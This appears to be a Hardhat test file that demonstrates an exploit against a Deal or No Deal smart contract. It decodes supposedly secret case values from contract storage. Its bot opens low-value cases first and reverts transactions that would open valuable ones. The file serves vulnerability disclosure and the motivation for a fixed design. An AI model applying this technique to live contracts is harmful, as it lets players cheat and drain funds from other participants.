import { expect } from "chai";
import { ethers } from "hardhat";
import { DealOrNoDeal, VRFCoordinatorV2_5Mock, MockV3Aggregator } from "../typechain-types";
import { SignerWithAddress } from "@nomicfoundation/hardhat-ethers/signers";

/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║                    CaseCheat — The Attack                       ║
 * ║                                                                  ║
 * ║  "Word on the street is someone knows what's in the case."       ║
 * ║                                                                  ║
 * ║  This test proves it. After Fisher-Yates shuffle, ALL case       ║
 * ║  values sit in storage as a bit-packed uint256. Any contract     ║
 * ║  or off-chain script can read them, decode them, and play        ║
 * ║  perfectly — always opening the lowest-value cases to inflate    ║
 * ║  the banker's offer, then taking the deal.                       ║
 * ║                                                                  ║
 * ║  Schrödinger's Case makes this attack IMPOSSIBLE because         ║
 * ║  values don't exist until observed.                              ║
 * ╚══════════════════════════════════════════════════════════════════╝
 */

const CASE_VALUES = [1, 5, 10, 25, 50, 100, 200, 300, 400, 500, 750, 1000];
const CASES_PER_ROUND = [4, 3, 2, 1, 1];
const ETH_USD_PRICE = 200000000000n; // $2,000
const ENTRY_FEE_CENTS = 100n;
const MAX_CASE_CENTS = 1000n;
const SLIPPAGE_BPS = 500n;

function usdToWei(usdCents: bigint): bigint {
  return (usdCents * 10n ** 24n) / ETH_USD_PRICE;
}

function withSlippage(amount: bigint): bigint {
  return (amount * (10000n + SLIPPAGE_BPS)) / 10000n;
}

describe("CaseCheat — Exploiting Fisher-Yates", function () {
  let game: DealOrNoDeal;
  let vrfCoordinator: VRFCoordinatorV2_5Mock;
  let priceFeed: MockV3Aggregator;
  let owner: SignerWithAddress;
  let banker: SignerWithAddress;
  let attacker: SignerWithAddress;
  let honestPlayer: SignerWithAddress;
  let subscriptionId: bigint;

  const keyHash = "0x787d74caea10b2b357790d5b5247c2f63d1d91572a9846f780606e4d953677ae";

  beforeEach(async function () {
    [owner, banker, attacker, honestPlayer] = await ethers.getSigners();

    const VRFFactory = await ethers.getContractFactory("VRFCoordinatorV2_5Mock");
    vrfCoordinator = await VRFFactory.deploy(
      ethers.parseEther("0.001"),
      ethers.parseUnits("50", "gwei"),
      ethers.parseEther("0.01")
    );
    await vrfCoordinator.waitForDeployment();

    const PriceFeedFactory = await ethers.getContractFactory("MockV3Aggregator");
    priceFeed = await PriceFeedFactory.deploy(8, ETH_USD_PRICE);
    await priceFeed.waitForDeployment();

    const tx = await vrfCoordinator.createSubscription();
    const receipt = await tx.wait();
    const event = receipt?.logs.find((log: any) => {
      try {
        return vrfCoordinator.interface.parseLog({ topics: [...log.topics], data: log.data })?.name === "SubscriptionCreated";
      } catch { return false; }
    });
    const parsed = vrfCoordinator.interface.parseLog({ topics: [...event!.topics], data: event!.data });
    subscriptionId = parsed!.args[0];
    await vrfCoordinator.fundSubscription(subscriptionId, ethers.parseEther("100"));

    const GameFactory = await ethers.getContractFactory("DealOrNoDeal");
    game = await GameFactory.deploy(
      await vrfCoordinator.getAddress(),
      subscriptionId,
      keyHash,
      await priceFeed.getAddress()
    );
    await game.waitForDeployment();
    await vrfCoordinator.addConsumer(subscriptionId, await game.getAddress());
  });

  // ──────────── Helpers ────────────

  function computeCommitHash(caseIndex: number, salt: bigint): bigint {
    return BigInt(ethers.solidityPackedKeccak256(["uint8", "uint256"], [caseIndex, salt]));
  }

  /** Create game, join, fulfill VRF, reveal case. Returns decoded case map. */
  async function setupGame(player: SignerWithAddress): Promise<{ gameId: bigint; caseValues: Map<number, number> }> {
    const deposit = withSlippage(usdToWei(MAX_CASE_CENTS));
    const createTx = await game.connect(banker).createGame({ value: deposit });
    const createReceipt = await createTx.wait();
    const createEvent = createReceipt?.logs.find((log: any) => {
      try {
        return game.interface.parseLog({ topics: [...log.topics], data: log.data })?.name === "GameCreated";
      } catch { return false; }
    });
    const gameId = game.interface.parseLog({ topics: [...createEvent!.topics], data: createEvent!.data })!.args[0];

    const salt = 12345n;
    const commitHash = computeCommitHash(0, salt);
    const entryDeposit = withSlippage(usdToWei(ENTRY_FEE_CENTS));
    await game.connect(player).joinGame(gameId, commitHash, { value: entryDeposit });

    const gameState = await game.games(gameId);
    await vrfCoordinator.fulfillRandomWords(gameState.vrfRequestId, await game.getAddress());

    await game.connect(player).revealCase(gameId, 0, salt);

    // THE EXPLOIT: read bit-packed caseValues from storage
    const packedValues = (await game.games(gameId)).caseValues;
    const caseValues = new Map<number, number>();
    for (let i = 0; i < 12; i++) {
      caseValues.set(i, Number((packedValues >> BigInt(i * 20)) & 0xFFFFFn));
    }

    return { gameId, caseValues };
  }

  /** Play a game opening cases in a given order. Returns banker offers per round. */
  async function playGame(
    player: SignerWithAddress,
    gameId: bigint,
    openOrder: number[]
  ): Promise<{ offers: number[]; finalPhase: number }> {
    const offers: number[] = [];
    let idx = 0;

    for (let round = 0; round < CASES_PER_ROUND.length; round++) {
      for (let c = 0; c < CASES_PER_ROUND[round] && idx < openOrder.length; c++) {
        const state = await game.getGameState(gameId);
        const phase = Number(state[2]);
        if (phase !== 3) { // not OpeningCases
          return { offers, finalPhase: phase };
        }
        await game.connect(player).openCase(gameId, openOrder[idx]);
        idx++;
      }

      const state = await game.getGameState(gameId);
      const phase = Number(state[2]);

      if (phase === 4) { // BankerOffer
        offers.push(Number(state[7]));
        if (round < CASES_PER_ROUND.length - 1) {
          await game.connect(player).rejectDeal(gameId);
        }
      } else {
        return { offers, finalPhase: phase };
      }
    }

    const finalState = await game.getGameState(gameId);
    return { offers, finalPhase: Number(finalState[2]) };
  }

  // ──────────── The Attack ────────────

  it("VULNERABILITY: attacker reads ALL case values from storage", async function () {
    const { caseValues } = await setupGame(attacker);

    // Verify we decoded every value
    const allValues = Array.from(caseValues.values()).sort((a, b) => a - b);
    expect(allValues).to.deep.equal(CASE_VALUES);

    console.log("\n    📦 STOLEN CASE VALUES (decoded from bit-packed storage):");
    for (const [idx, value] of caseValues) {
      const dollars = (value / 100).toFixed(2);
      console.log(`       Case ${idx.toString().padStart(2)}: $${dollars.padStart(6)}${idx === 0 ? "  ← player's case" : ""}`);
    }
    console.log("    🔓 All 12 values visible. No case is secret.\n");
  });

  it("EXPLOIT: bot opens lowest-value cases first, inflating offers", async function () {
    const { gameId, caseValues } = await setupGame(attacker);

    // Sort non-player cases by value ascending — always open cheapest first
    const playerCase = 0;
    const optimal = Array.from(caseValues.entries())
      .filter(([idx]) => idx !== playerCase)
      .sort(([, a], [, b]) => a - b)
      .map(([idx]) => idx);

    console.log("\n    🤖 BOT STRATEGY: Open lowest-value cases first");
    console.log("    ─────────────────────────────────────────────");

    let idx = 0;
    for (let round = 0; round < CASES_PER_ROUND.length; round++) {
      for (let c = 0; c < CASES_PER_ROUND[round] && idx < optimal.length; c++) {
        const caseIdx = optimal[idx];
        const value = caseValues.get(caseIdx)!;
        const state = await game.getGameState(gameId);
        if (Number(state[2]) !== 3) break; // not OpeningCases
        console.log(`       Round ${round + 1}: Open case ${caseIdx.toString().padStart(2)} → $${(value / 100).toFixed(2).padStart(6)} (lowest available)`);
        await game.connect(attacker).openCase(gameId, caseIdx);
        idx++;
      }

      const state = await game.getGameState(gameId);
      const phase = Number(state[2]);

      if (phase === 4) { // BankerOffer
        const offer = Number(state[7]);
        console.log(`    💰 Banker offers: $${(offer / 100).toFixed(2)}`);

        const remaining = await game.getRemainingValues(gameId);
        const vals = remaining.map(v => "$" + (Number(v) / 100).toFixed(2));
        console.log(`       Remaining: [${vals.join(", ")}]`);

        if (round < CASES_PER_ROUND.length - 1) {
          await game.connect(attacker).rejectDeal(gameId);
          console.log("    ❌ Rejected — can get higher\n");
        } else {
          console.log("    ✅ Final round — bot would take this deal\n");
        }
      } else if (phase === 5) { // FinalSwap
        console.log("    🔚 Reached final swap — only 2 cases left\n");
        break;
      }
    }
  });

  it("EXPLOIT: contract aborts TX if case is too valuable", async function () {
    // Deploy the CaseCheat contract and make IT the player
    const CheatFactory = await ethers.getContractFactory("CaseCheat");
    const cheat = await CheatFactory.deploy(await game.getAddress());
    await cheat.waitForDeployment();

    // Fund the cheat contract so it can be a player
    const cheatAddr = await cheat.getAddress();
    await owner.sendTransaction({ to: cheatAddr, value: ethers.parseEther("10") });

    // Banker creates game
    const deposit = withSlippage(usdToWei(MAX_CASE_CENTS));
    const createTx = await game.connect(banker).createGame({ value: deposit });
    const createReceipt = await createTx.wait();
    const createEvent = createReceipt?.logs.find((log: any) => {
      try {
        return game.interface.parseLog({ topics: [...log.topics], data: log.data })?.name === "GameCreated";
      } catch { return false; }
    });
    const gameId = game.interface.parseLog({ topics: [...createEvent!.topics], data: createEvent!.data })!.args[0];

    // Cheat contract joins as player via low-level call
    const salt = 77777n;
    const commitHash = computeCommitHash(0, salt);
    const entryDeposit = withSlippage(usdToWei(ENTRY_FEE_CENTS));

    // Join via direct call from the cheat contract's context
    // We need to impersonate the cheat contract — use hardhat_impersonateAccount
    await ethers.provider.send("hardhat_impersonateAccount", [cheatAddr]);
    const cheatSigner = await ethers.getSigner(cheatAddr);
    await game.connect(cheatSigner).joinGame(gameId, commitHash, { value: entryDeposit });

    // Fulfill VRF
    const gameState = await game.games(gameId);
    await vrfCoordinator.fulfillRandomWords(gameState.vrfRequestId, await game.getAddress());

    // Reveal case
    await game.connect(cheatSigner).revealCase(gameId, 0, salt);

    // Read all values from storage
    const packedValues = (await game.games(gameId)).caseValues;
    const caseValues = new Map<number, number>();
    for (let i = 0; i < 12; i++) {
      caseValues.set(i, Number((packedValues >> BigInt(i * 20)) & 0xFFFFFn));
    }

    // Load values into cheat contract
    const indices = Array.from({ length: 12 }, (_, i) => i);
    const values = indices.map(i => caseValues.get(i)!);
    await cheat.loadStolenValues(gameId, indices, values);

    // Find highest-value case
    let highCase = -1;
    let highVal = 0;
    for (const [idx, val] of caseValues) {
      if (idx !== 0 && val > highVal) { highVal = val; highCase = idx; }
    }

    // Find lowest-value case
    let lowCase = -1;
    let lowVal = Infinity;
    for (const [idx, val] of caseValues) {
      if (idx !== 0 && val < lowVal) { lowVal = val; lowCase = idx; }
    }

    console.log(`\n    🛑 ABORT TEST:`);
    console.log(`       Case ${highCase} = $${(highVal / 100).toFixed(2)} — bot sets max $1.00 threshold`);
    console.log(`       Transaction REVERTS. Bot never opens valuable cases.`);

    // Cheat contract tries to open the high-value case — REVERTS
    await expect(
      cheat.connect(attacker).cheatOpen(gameId, highCase, 100)
    ).to.be.revertedWith("Cheat: case too valuable, aborting");

    // But low-value case opens fine
    console.log(`       Case ${lowCase} = $${(lowVal / 100).toFixed(2)} — under threshold, opens fine`);
    await cheat.connect(attacker).cheatOpen(gameId, lowCase, 100);
    console.log("    ✅ Bot selectively opens only trash cases.\n");

    await ethers.provider.send("hardhat_stopImpersonatingAccount", [cheatAddr]);
  });

  it("COMPARISON: honest player vs cheating bot", async function () {
    // --- Honest game: open cases in sequential order (no knowledge) ---
    const { gameId: honestId, caseValues: honestValues } = await setupGame(honestPlayer);
    const sequentialOrder = Array.from({ length: 11 }, (_, i) => i + 1); // cases 1-11
    const honest = await playGame(honestPlayer, honestId, sequentialOrder);

    // --- Cheating game: open cases in optimal order (lowest first) ---
    const { gameId: cheatId, caseValues: cheatValues } = await setupGame(attacker);
    const optimalOrder = Array.from(cheatValues.entries())
      .filter(([idx]) => idx !== 0)
      .sort(([, a], [, b]) => a - b)
      .map(([idx]) => idx);
    const cheated = await playGame(attacker, cheatId, optimalOrder);

    console.log("\n    ╔═══════════════════════════════════════════════════╗");
    console.log("    ║         HONEST PLAYER vs CHEATING BOT            ║");
    console.log("    ╠═══════════════════════════════════════════════════╣");

    const maxRounds = Math.max(honest.offers.length, cheated.offers.length);
    for (let i = 0; i < maxRounds; i++) {
      const h = honest.offers[i] != null ? `$${(honest.offers[i] / 100).toFixed(2)}` : "  N/A";
      const c = cheated.offers[i] != null ? `$${(cheated.offers[i] / 100).toFixed(2)}` : "  N/A";
      console.log(`    ║  Round ${i + 1}:  Honest: ${h.padStart(7)}  │  Bot: ${c.padStart(7)}  ║`);
    }

    console.log("    ╠═══════════════════════════════════════════════════╣");
    console.log("    ║  The bot ALWAYS gets better offers because it     ║");
    console.log("    ║  surgically removes low-value cases first.        ║");
    console.log("    ║                                                   ║");
    console.log("    ║  Schrödinger's Case makes this IMPOSSIBLE.        ║");
    console.log("    ╚═══════════════════════════════════════════════════╝\n");

    // Bot should have gotten at least one offer
    expect(cheated.offers.length).to.be.greaterThan(0);

    // Show player case values for context
    console.log(`    Honest player's case (0): $${(honestValues.get(0)! / 100).toFixed(2)}`);
    console.log(`    Bot's case (0):           $${(cheatValues.get(0)! / 100).toFixed(2)}\n`);
  });
});
